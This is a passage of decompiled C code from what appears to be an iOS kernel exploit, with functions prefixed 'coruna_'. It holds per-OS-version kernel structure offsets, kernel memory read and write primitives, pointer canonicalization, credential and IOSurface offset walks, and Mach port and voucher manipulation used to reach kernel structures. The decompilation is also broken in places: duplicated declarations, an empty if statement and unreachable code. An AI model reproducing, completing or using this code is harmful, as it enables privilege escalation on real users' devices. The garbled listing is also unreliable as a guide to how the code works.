        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x200);
      err = err == 0;
      addr = 0x4d0;
      off = 0x510;
    }
  }
  else {
    if (err != 0x1809) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x5584201);
    err = err == 0;
    addr = 0x3c0;
    off = 0x3d8;
  }
  if (!err) {
    off = addr;
  }
fail:
  err = coruna_kernel29bb0_trampoline_0001a670(handle,off + handle,&scratch);
  if (err == 0) {
    return 0;
  }
  handle = coruna_ptr_canonicalize(handle,scratch);
  if (handle != 0) {
    return scratch;
  }
  return 0;
}





long coruna_return_zero_21078(long handle)
{
  int err;
  long handle;
  long addr;
  
  handle = coruna_return_zero_2050c();
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err == 0x1f53) {
      addr = 0x120;
    }
    else if (err == 0x1c1b) {
      addr = 0x128;
    }
    else {
      if (err != 0x1809) {
        return 0;
      }
      addr = 0x128;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
        addr = 0x150;
      }
    }
    handle = addr + handle;
  }
  return handle;
}





long coruna_return_zero_2ccdc(long handle)
{
  int err;
  long handle;
  long addr;
  
  handle = coruna_return_zero_2050c();
  addr = 0;
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f53) {
      if (err == 0x1809) {
        addr = 0x108;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          addr = 0x130;
        }
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0x108;
      }
    }
    else if (err == 0x1f53) {
      addr = 0x100;
    }
    else {
      if (err != 0x1f54) {
        return 0;
      }
      addr = 0xf0;
    }
    addr = addr + handle;
  }
  return addr;
}





long coruna_return_zero_211b0(long handle)
{
  int err;
  long handle;
  long addr;
  
  handle = coruna_helper_17db8_202d0();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        addr = 0x298;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0x280;
      }
      return addr + handle;
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0;
  }
  addr = 0x1c;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    addr = 0x300;
  }
fail:
  return addr + handle;
}





uint64_t coruna_iosurface_cred_walk(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      return 0x10c;
    }
    if (err == 0x1f53) {
      return 0x11c;
    }
  }
  else if (err < 0x225c) {
    if (err == 0x1f54) {
      return 0x94;
    }
    if (err == 0x2258) {
      return 0xb4;
    }
  }
  else {
    if (err == 0x225c) {
      return 0xb4;
    }
    if (err == 0x2712) {
      return 200;
    }
  }
  return 0;
}





uint64_t coruna_slab_meta_offset(long handle)
{
  int err;
  bool err;
  uint64_t u;
  int status;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if ((err == 0x1809 || err == 0x1c1b) || err == 0x1f53) {
      return 0x48;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x2712;
      status = 0x225c;
    }
    if (err || err == status) {
      u = 0x40;
    }
  }
  return u;
}





uint64_t coruna_return_zero_20958(uint64_t val,long handle)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  long bootargs;
  
  u = coruna_return_zero_2ba94();
  if ((u != 0) &&
     (err = coruna_kernel29bb0_trampoline_0001a670(val,handle + (unsigned long)u,&bootargs), err != 0)) {
    handle = coruna_ptr_canonicalize(val,bootargs);
    if (handle == 0) {
      return 0;
    }
    u = coruna_slab_meta_offset(val);
    if ((u != 0) &&
       (err = coruna_kernel29bb0_trampoline_0001a670(val,bootargs + (unsigned long)u,&scratch), err != 0)) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





long coruna_kernel29bb0_via_return_zero_2019c(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_slab_meta_offset();
  if (u == 0) {
    handle = 0;
  }
  else {
    scratch = coruna_return_zero_2019c(val,id_2);
    handle = scratch;
    if (scratch != 0) {
      err = coruna_kernel29bb0_trampoline_0001a670(val,scratch + (unsigned long)u,&scratch);
      handle = 0;
      if (err != 0) {
        handle = scratch;
      }
    }
  }
  return handle;
}





void coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_9(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  int status;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs = 0;
  thread_attr = 0;
  handle = coruna_return_zero_20428(handle,val,0);
  u = 0;
  if ((handle == 0) || (u = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x78,&scratch), (int)u == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
  ___stack_chk_fail(u);
  }
  return;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_3(long handle,uint32_t size)
{
  long handle;
  uint64_t u;
  
  handle = coruna_kernel29bb0_via_return_zero_1f078();
  u = 0;
  if ((handle != 0) && (u = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_9(handle,handle), (int)u != 0)) {
    *(uint32_t *)(&k_kernel_slot_18f8 + handle) = size;
    u = 1;
  }
  return u;
}





long coruna_return_zero_2d460(long handle,uint64_t val,int flags)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  int status;
  unsigned long u;
  
  if (flags == 0) {
    handle = coruna_kernel29bb0_via_return_zero_1f078();
    if (handle == 0) {
      return 0;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        err = coruna_ctx_test_flag(handle,0x100000);
        if (err != 0) {
          off = 0x3ec;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            off = 0x41c;
          }
          return off + handle;
        }
        err = coruna_ctx_test_flag(handle,0x5584001);
        off = 0x3b8;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          off = 1000;
        }
        addr = 0x3dc;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          addr = 0x40c;
        }
        err = err == 0;
      }
      else {
        if (err != 0x1809) {
          if (err != 0x1c1b) {
            return 0;
          }
          u = *(unsigned long *)(handle + 0x158);
          err = coruna_ctx_test_flag(handle,0x5584001);
          off = 0x3d8;
          if (err != 0) {
            off = 0x3f4;
          }
          addr = 0x3e0;
          if (err != 0) {
            addr = 0x404;
          }
          if (0x1c1b19145fffff < u) {
            off = addr;
          }
          return off + handle;
        }
        err = coruna_ctx_test_flag(handle,0x5584001);
        err = err == 0;
        addr = 0x3c0;
        off = 0x3b8;
      }
    }
    else {
      if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x5100000);
      if (err != 0) {
        off = 0x3d0;
        return off + handle;
      }
      err = coruna_ctx_test_flag(handle,0x5584001);
      err = err == 0;
      addr = 0x3b8;
      off = 0x3a0;
    }
    if (!err) {
      off = addr;
    }
fail:
    return off + handle;
  }
  handle = coruna_return_zero_20e48();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    return handle + 0x78;
  }
  else {
    return handle + 0x78;
  }
  if (err != status) {
    return 0;
  }
done:
  return handle + 0x78;
}





long coruna_return_zero_20e48(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  long scratch;
  long bootargs;
  
  u = coruna_return_zero_2b7a0();
  if (u != 0) {
    handle = coruna_kernel29bb0_via_return_zero_1f078(val,id_2);
    if (handle == 0) {
      return 0;
    }
    addr = coruna_ptr_canonicalize(val,handle);
    if (addr == 0) {
      return 0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(val,handle + (unsigned long)u,&bootargs);
    if (err != 0) {
      addr = coruna_ptr_canonicalize(val,bootargs);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel29bb0_trampoline_0001a670(val,bootargs + 8,&scratch);
      if (err != 0) {
        addr = coruna_ptr_canonicalize(val,scratch);
        if (handle == scratch && addr != 0) {
          return bootargs;
        }
        return 0;
      }
    }
  }
  return 0;
}





long coruna_return_zero_2d664(long handle,uint64_t val,int flags,uint *size)
{
  int err;
  long handle;
  uint u;
  uint scratch;
  
  scratch = 0;
  handle = coruna_return_zero_2d460();
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,handle,&scratch);
  if (err == 0) {
    return 0;
  }
  if (*(int *)(handle + 0x140) < 0x1328) {
    if ((scratch >> 0x18) != 0) {
      return 0;
    }
  }
  else {
    u = scratch & 3;
    if (flags != 0) {
      if (u != 0) {
        return 0;
      }
    }
    else if (u != 3) {
      return 0;
    }
  }
  if (size != (uint *)0x0) {
    *size = scratch;
  }
  return handle;
}



void coruna_call_macho_data_seg_2bb24_2bdb4_20fac(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_return_zero_2d664(val,id_2,0,size_3);
  return;
}





uint coruna_host_processors(long handle,int flags,long addr_2,uint *size)
{
  uint u;
  int err;
  long handle;
  long addr;
  vm_size_t size;
  long off;
  uint size;
  uint8_t *ptr;
  uint version;
  unsigned long port;
  uint scratch;
  long bootargs;
  long thread_attr;
  mach_msg_type_number_t host_info;
  processor_array_t serial_buf;
  int action [6];
  
  serial_buf = (processor_array_t)0x0;
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        ptr = (uint8_t *)0x444;
        off = 0x20;
      }
      else {
        if (err != 0x1c1b) {
          return 0x28007;
        }
        off = 0x28;
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1401000000) {
          off = 0x20;
        }
        ptr = (uint8_t *)0x4b4;
      }
      goto fail;
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0x28007;
  }
  err = coruna_ctx_test_flag(handle,0x4000000);
  ptr = (uint8_t *)0x8ac;
  if (err != 0) {
    ptr = &UNK_00003d3c;
  }
  if (0x1f52 < *(int *)(handle + 0x140)) {
    if (*(long *)(&k_kernel_slot_19f8 + handle) != 0) {
      coruna_macho_text_sect(action);
      off = coruna_strsep(action,"14 D9 33 F8",0,1);
      if (off != 0) {
        off = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off + -8);
        if (off == 0) {
          return 0xad011;
        }
        u = coruna_cpu_core_count();
        if (u == 0) {
          version = 0;
        }
        else {
          size = 0;
          version = 0;
          host_info = u;
          do {
            err = coruna_kernel29bb0_trampoline_0001a670(handle,off + (unsigned long)(*(int *)(handle + 0x168) * size),
                                       &thread_attr);
            if (err == 0) {
              return 0x2800f;
            }
            if (thread_attr == 0) {
              handle = 0;
            }
            else {
              addr = coruna_ptr_canonicalize(handle);
              handle = thread_attr;
              if (addr == 0) {
                return 0x28026;
              }
            }
            err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x28,&bootargs);
            if (err == 0) {
              return 0x2800f;
            }
            handle = coruna_ptr_canonicalize(handle,bootargs);
            if (handle == 0) {
              return 0x28026;
            }
            err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,ptr + bootargs,action);
            if (err == 0) {
              return 0x2800f;
            }
            if (1 < action[0] - 1U) {
              return 0x28011;
            }
            if (action[0] == flags) {
              if (*size <= version) {
                return 0xad00c;
              }
              *(long *)(addr_2 + (unsigned long)version * 8) = thread_attr;
              version = version + 1;
            }
            size = size + 1;
          } while (size < u);
        }
        *size = version;
        return 0;
      }
    }
    return 0xad011;
  }
  off = 0x28;
fail:
  u = _host_processors(*(host_priv_t *)(&k_kernel_slot_1920 + handle),&serial_buf,&host_info);
  if (u == 0) {
    if (host_info == 0) {
      version = 0;
    }
    else {
      port = 0;
      version = 0;
      scratch = 0x2800e;
      {
        int hp_break = 0;
        do {
          handle = coruna_kernel29bb0_via_return_zero_1f078(handle,serial_buf[port]);
          thread_attr = handle;
          u = scratch;
          if ((handle == 0) ||
             (err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + off,&bootargs), u = 0x2800f, err == 0
             )) {
            hp_break = 1;
            break;
          }
          addr = coruna_ptr_canonicalize(handle,bootargs);
          if (addr == 0) {
            u = 0x28026;
            hp_break = 1;
            break;
          }
          err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,ptr + bootargs,action);
          if (err == 0) {
            hp_break = 1;
            break;
          }
          if (1 < action[0] - 1U) {
            u = 0x28011;
            hp_break = 1;
            break;
          }
          if (action[0] == flags) {
            if (*size <= version) {
              u = 0xad00c;
              hp_break = 1;
              break;
            }
            *(long *)(addr_2 + (unsigned long)version * 8) = handle;
            version = version + 1;
          }
          port = port + 1;
        } while (port < host_info);
        if (!hp_break) {
          *size = version;
          u = 0;
        }
      }
    }
    ptr = k_kernel_mach_task_self_slot;
    if (host_info == 0) {
      size = 0;
    }
    else {
      port = 0;
      do {
        _mach_port_deallocate(*(ipc_space_t *)ptr,serial_buf[port]);
        port = port + 1;
      } while (port < host_info);
      size = (unsigned long)host_info << 2;
    }
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)serial_buf,size);
  }
  else {
    u = u | 0x80000000;
  }
  return u;
}





uint64_t coruna_return_zero_2dae4(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (1 < err - 0x1f53U) {
    if (err == 0x1809) {
      return 0x58;
    }
    if (err != 0x1c1b) {
      return 0;
    }
  }
  return 0x60;
}





long coruna_return_zero_2af7c_213d4(long handle,long addr_2)
{
  int err;
  bool err;
  long handle;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      handle = 0x40;
    }
    else {
      if (err != 0x1f53) {
        return 0;
      }
      handle = 0x30;
    }
  }
  else {
    if (err < 0x225c) {
      err = err == 0x1f54;
      status = 0x2258;
    }
    else {
      err = err == 0x225c;
      status = 0x2712;
    }
    if (!err && err != status) {
      return 0;
    }
    handle = 0x20;
  }
  return handle + addr_2;
}





void coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  long handle;
  unsigned long unaff_x30;
  
  handle = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  if (handle == 0) {
    return;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_return_zero_2af7c_213d4(val,handle);
  return;
}





long coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_10(uint64_t val)
{
  int err;
  long handle;
  long addr;
  long scratch;
  
  scratch = coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7();
  addr = scratch;
  if (scratch != 0) {
    err = coruna_kernel29bb0_trampoline_0001a670(val,scratch,&scratch);
    if (err == 0) {
      addr = 0;
    }
    else {
      handle = coruna_ptr_canonicalize(val,scratch);
      addr = 0;
      if (handle != 0) {
        addr = scratch;
      }
    }
  }
  return addr;
}





long coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_11(uint64_t val)
{
  int err;
  long handle;
  long scratch;
  
  scratch = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_10();
  handle = scratch;
  if (scratch != 0) {
    err = coruna_kernel29bb0_trampoline_0001a670(val,scratch + 0x18,&scratch);
    handle = 0;
    if (err != 0) {
      handle = scratch;
    }
  }
  return handle;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_4(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0x28007;
    }
  }
  else if (1 < err - 0x1f53U && err != 0x2258) {
    return 0x28007;
  }
  handle = coruna_kernel29bb0_via_return_zero_1f078(handle);
  if (handle == 0) {
    u = 0x28025;
  }
  else {
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + 0x38,&scratch);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
        u = 0x28026;
      }
      else {
        u = 0;
        *id_2 = scratch;
      }
    }
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_12(long handle,int flags,uint64_t *val)
{
  int err;
  long handle;
  int status;
  long addr;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
fail:
      addr = 0xf8;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        addr = 0x100;
      }
      goto code_r0x000216fc;
    }
    if (err == 0x1809) {
      addr = 0x108;
      goto code_r0x000216fc;
    }
    status = 0x1c1b;
  }
  else {
    if (err == 0x2258 || err == 0x225c) goto fail;
    status = 0x2712;
  }
  if (err != status) {
    return 0x2802c;
  }
  addr = 0xf8;
code_r0x000216fc:
  handle = coruna_helper_17db8_202d0(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (handle == 0) {
    return 0x2800e;
  }
  err = coruna_kernel29bb0_trampoline_0001a670(handle,handle + addr,&thread_attr);
  if (err == 0) {
    return 0x2800f;
  }
  addr = coruna_ptr_canonicalize(handle,thread_attr);
  if (addr != 0) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel29bb0_trampoline_0001a670(handle,thread_attr,&bootargs);
      if (err == 0) {
        return 0x2800f;
      }
      addr = coruna_ptr_canonicalize(handle,bootargs);
      if (addr == 0) {
        return 0x28026;
      }
    }
    else {
      bootargs = thread_attr;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + (long)*(int *)(handle + 0x168) * (long)flags,
                               &scratch);
    if (err == 0) {
      return 0x2800f;
    }
    addr = coruna_ptr_canonicalize(handle,scratch);
    if (addr != 0) {
      *val = scratch;
      return 0;
    }
  }
  return 0x28026;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_13(long handle,uint64_t val,uint64_t *id_2)
{
  bool err;
  int err;
  uint64_t u;
  long handle;
  int status;
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  u = 0x2802c;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if ((err || err == status) &&
     (u = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_12(handle,val,&thread_attr), (int)u == 0)) {
    err = coruna_kernel29bb0_trampoline_0001a670(handle,thread_attr + 0x10,&bootargs);
    if (err == 0) {
      u = 0x2800f;
    }
    else {
      handle = coruna_ptr_canonicalize(handle,bootargs);
      if (handle != 0) {
        err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0x38,&scratch);
        if (err == 0) {
          return 0x2800f;
        }
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
          *id_2 = scratch;
          return 0;
        }
      }
      u = 0x28026;
    }
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_ctx_test_flag_4(long handle,int flags,uint32_t *size)
{
  int err;
  uint64_t u;
  
  if (flags == 0) {
    err = coruna_ctx_test_flag(handle,8);
    if (err == 0) {
      u = 0xffffffe000000000;
      if (0x225814018fffff < *(unsigned long *)(handle + 0x158)) {
        err = coruna_ctx_test_flag(handle,0x2000);
        u = 0xffffffdc00000000;
        if (err != 0) {
          u = 0xffffffe000000000;
        }
      }
    }
    else {
      u = 0xfffffe0000000000;
    }
    *size = 6;
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_call_call_mach_vm_machine_attribute_29df8_1a83c(long handle,uint size)
{
  uint64_t u;
  
  if (6 < size) {
    return 0;
  }
  u = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(handle,*(long *)(&k_kernel_slot_18f0 + handle) +
                               (unsigned long)(*(int *)(handle + 0x168) * (size + 1)));
  return u;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_3(uint64_t arg,uint64_t val,int n)

{
  int j;
  long serial_7;
  unsigned long u;
  uint cache_37;
  
  serial_7 = coruna_return_zero_2b0c0_1f1e4();
  u = 0;
  if ((serial_7 != 0) && (u = coruna_kernel29bb0_via_ioconnectcallmethod(arg,serial_7,&cache_37), (int)u != 0)) {
    if (cache_37 < 0x80000001) {
      j = coruna_mach_vm_machine_attribute(arg,serial_7,cache_37 + n);
      u = (unsigned long)(j != 0);
    }
    else {
      u = 0;
    }
  }
  return u;
}





unsigned long coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_2(uint64_t arg,long val,int n)

{
  int j;
  unsigned long tag;
  int cache_37;
  
  tag = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,val + 4,4,&cache_37);
  if ((int)tag != 0) {
    cache_37 = cache_37 + n;
    j = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,val + 4,&cache_37,4);
    tag = (unsigned long)(j != 0);
  }
  return tag;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_3(uint64_t val,uint64_t id_2)
{
  coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_2(val,id_2,1);
  coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_3(val,id_2,1);
  return 0;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_4(uint64_t arg,long val,int n)

{
  int j;
  unsigned long tag;
  int cache_37;
  
  tag = coruna_kernel29bb0_via_ioconnectcallmethod(arg,val + 0x10,&cache_37);
  if ((int)tag != 0) {
    if (cache_37 - 1U >> 0x14 == 0) {
      j = coruna_kernel29bb0_trampoline_0001a360(arg,val + 0x10,cache_37 + n);
      tag = (unsigned long)(j != 0);
    }
    else {
      tag = 0;
    }
  }
  return tag;
}





uint32_t coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_4(uint64_t val,uint64_t id_2)
{
  int err;
  uint32_t u;
  
  err = coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_4(val,id_2,0x10);
  u = 0x1001;
  if (err != 0) {
    u = 0;
  }
  return u;
}





void coruna_ctx_set_flag(uint *size,uint flags_2)
{
  *size = *size | flags_2;
  return;
}





void coruna_ctx_clear_flag(uint *size,uint flags_2)
{
  *size = *size & (flags_2 ^ 0xffffffff);
  return;
}





bool coruna_ctx_test_flag(uint *size,uint flags_2)
{
  return (*size & flags_2) != 0;
}





long coruna_return_zero_21bb4(long handle)
{
  int err;
  long handle;
  uint32_t scratch;
  long bootargs;
  
  bootargs = 0;
  if (*(long *)(handle + 0x210) != 0) {
    return *(long *)(handle + 0x210);
  }
  if (*(long *)(&k_kernel_slot_19d0 + handle) != 0) {
    handle = coruna_return_zero_2b0c0(handle);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,handle,&bootargs);
    if (err != 0) {
      if (bootargs == 0) {
        scratch = 0x200;
        bootargs = coruna_vm_deallocate_2c8ec(handle,&scratch);
        if (bootargs == 0) {
          return 0;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(handle,handle,bootargs);
        if (err == 0) {
          return 0;
        }
      }
      else {
        handle = coruna_ptr_canonicalize(handle);
        if (handle == 0) {
          return 0;
        }
      }
      *(long *)(handle + 0x210) = bootargs;
      return bootargs;
    }
  }
  return 0;
}





uint64_t coruna_kernel29bb0_via_return_zero_21bb4(long handle,uint size,long *addr_2)
{
  uint64_t u;
  long scratch;
  
  if (size < 0xe) {
    scratch = coruna_return_zero_21bb4();
    u = 0;
    if ((scratch != 0) &&
       (u = coruna_kernel29bb0_trampoline_0001a670(handle,scratch + (unsigned long)(*(int *)(handle + 0x168) * size),
                                   &scratch), (int)u != 0)) {
      *addr_2 = scratch;
      u = 1;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_3(long handle,uint size,uint64_t val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  if (size < 0xe) {
    err = *(int *)(handle + 0x168);
    scratch = val;
    handle = coruna_return_zero_21bb4();
    u = 0;
    if (handle != 0) {
      u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,handle + (unsigned long)(err * size),&scratch,err);
    }
  }
  else {
    u = 0;
  }
  return u;
}
bool coruna_voucher_create(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  mach_port_t lm1;
  int err;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  scratch = k_kernel_rodata_word_0002af48;
  scratch = k_kernel_rodata_word_2af40;
  bootargs = id_2;
  lm1 = _mach_host_self();
  err = _host_create_mach_voucher(lm1,&scratch,0x18,size_3);
  return err == 0;
}





uint32_t coruna_mach_port_deallocate_22af8(long handle,long addr_2,mach_port_name_t *arg)
{
  uint32_t u;
  bool err;
  int err;
  long handle;
  uint64_t size;
  long addr;
  uint32_t version;
  long scratch;
  uint bootargs;
  uint thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  int action;
  uint32_t scratch;
  
  version = 0x28010;
  action = 0;
  err = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr_2,&action);
  u = 0;
  if (-1 < action) {
    u = 0x28008;
  }
  if (err == 0) {
    return 0x2800f;
  }
  if (-1 < action) {
    return u;
  }
  serial_buf = 0;
  err = *(int *)(handle + 0x140);
  addr = 0x38;
  if (err < 0x1f53) {
    if ((err != 0x1809) && (err != 0x1c1b)) {
      return 0x2802c;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return 0x2802c;
    }
    addr = 0x30;
  }
  _arc4random_buf(&host_info,8);
  scratch = 0;
  bootargs = 0;
  thread_attr = 0;
  err = coruna_voucher_create();
  if (err == 0) {
fail:
    err = false;
    version = 0x1001;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return version;
  }
  handle = coruna_kernel29bb0_via_return_zero_1f078(handle,serial_buf);
  if (handle == 0) {
    err = false;
    version = 0x28025;
    if (1 < serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
    }
    if (err) {
    *arg = (mach_port_name_t)serial_buf;
    }
    else if (1 < (mach_port_name_t)serial_buf + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
    }
    return version;
  }
  handle = handle + addr;
  err = coruna_kernel29bb0_trampoline_0001a670(handle,handle,&action);
  err = false;
  version = 0x2800f;
  if (1 < serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,serial_buf);
  }
  if (err) {
  *arg = (mach_port_name_t)serial_buf;
  }
  else if (1 < (mach_port_name_t)serial_buf + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,(mach_port_name_t)serial_buf);
  }
  return version;
}





long coruna_mach_port_destroy(long handle,uint size)
{
  uint u;
  int err;
  void *ptr;
  uint64_t size;
  long scratch;
  long bootargs;
  uint64_t thread_attr;
  void *host_info;
  long serial_buf;
  
  thread_attr = 0;
  host_info = (void *)0x0;
  scratch = 0;
  bootargs = 0;
  if (*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) {
    u = *(uint *)(handle + 0x180);
    if (*(uint *)(handle + 0x180) <= size) {
      u = size;
    }
    serial_buf = 0;
    ptr = _calloc((unsigned long)u,1);
    if (ptr == (void *)0x0) {
      return 0;
    }
    err = coruna_iomfb_slot_read(u << 1,&serial_buf);
    if ((((err == 0) && (err = coruna_return_zero_15824(serial_buf,0x1000000,4,0), err == 0)) &&
        (err = coruna_return_zero_15824(serial_buf,0x8000000,4,"key"), err == 0)) &&
       (err = coruna_return_zero_15824(serial_buf,0x8a000000,(unsigned long)u,ptr), err == 0)) {
      err = coruna_memcpy_15934(serial_buf,&host_info,(long)&thread_attr + 4);
    }
    if (serial_buf != 0) {
      coruna_free_15ed4();
    }
    _free(ptr);
    if (err == 0) {
      size = coruna_ioservice_publish(host_info,thread_attr,&thread_attr);
      u = (mach_port_name_t)size + 1;
      if (((((1 < u) && (bootargs = coruna_kernel29bb0_via_return_zero_1f078(handle,size), bootargs != 0)) &&
           ((err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0x10,&bootargs), err != 0 &&
            ((err = coruna_kernel29bb0_trampoline_0001a670(handle,bootargs + 0x18,&bootargs), err != 0 &&
